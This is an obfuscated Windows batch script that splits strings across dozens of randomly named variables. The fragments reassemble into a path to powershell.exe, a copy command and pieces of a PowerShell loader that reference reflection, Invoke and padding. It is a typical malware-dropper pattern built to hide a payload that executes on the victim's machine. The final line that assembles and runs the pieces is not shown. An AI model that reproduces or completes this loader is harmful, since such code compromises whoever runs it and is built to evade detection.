@echo off
set "uIzkLYyhoy=Sy"
set "cuzxQTdqir=ow"
set "XgyyyGWMsN=xe"
set "YyrqTcnIAt=s\"
set "KcfAZLPASc=0\"
set "wNHXYPWrEb=he"
set "LQGUIRJCeT=rs"
set "uVbJOnQtVv=\W"
set "EBCBuKcEFu=ll"
set "UOdeFhrWqe=\v"
set "uMNOGkfhWz= C"
set "uKFmRzIsOK=py"
set "rnqhHtUoMS=32"
set "WZlMaHJCrQ=po"
set "kNBrgqtAqb=do"
set "NgczaFWRBc=nd"
set "Irnfqgsqei=.e"
set "aLRpHHuJCx=we"
set "RryennPxIL=Wi"
set "kzpqNpOLGX=em"
set "DKHXvxRanu=st"
set "PeXJlaDXXb=y "
set "rJFiniBwXW=co"
set "sRdohhGscI=he"
set "gSfdqneUrS=1."
set "kmvfjUsjxw=in"
set "xiBDaQLYNt=ll"
set "xaaAUFdymN=we"
set "fBGpezBjax=:\"
set "yuQkMfSkYM=Po"
set "CCovaoyFCz=ws"
set "UqdTTHYZfU=rS"
set "YLvDiknfAY= /"
set "BVUNAuQlZJ=cd"
set "jeUUafCYsi= %~dp0"
set "npXDRfWJTi=::('"
set "MJmMhRCvoc=g = "
set "fFrlbmyyRZ=v = "
set "pBmckztdzY=;$Ds"
set "grKCAqksEl=k; }"
set "vBvckzkMKH=3HWs"
set "WPQmPqOATi=UGTu"
set "llcZLWKtpY=Fina"
set "huYhfOwwbe=join"
set "tUjWcArfgR=b.Su"
set "ZqIODeGgpH=();$"
set "pepfdShKSq=$GZF"
set "WFkqDVZseo=O.Me"
set "MlrKhrEHGp=ZYYc"
set "dJywygTAUy=Rju."
set "doRHehEwAq=yTo("
set "ysPPBkbLDC=..-1"
set "uqJShndQRF=Invo"
set "zwWipLLHVB=[Sys"
set "maHyYTAFRB=MT ="
set "VpCaMyZcQw= = $"
set "BxrzANpaVu=th('"
set "RWGzSAVUYg=$jhr"
set "KIQejpBgAE='[-1"
set "DVXwvKsNoM=);$s"
set "KiWTUWCVce=aI.D"
set "YcTBOdozoC=m.Re"
set "aOqthUNmlu=, (,"
set "kqxtJfxIUc=ddin"
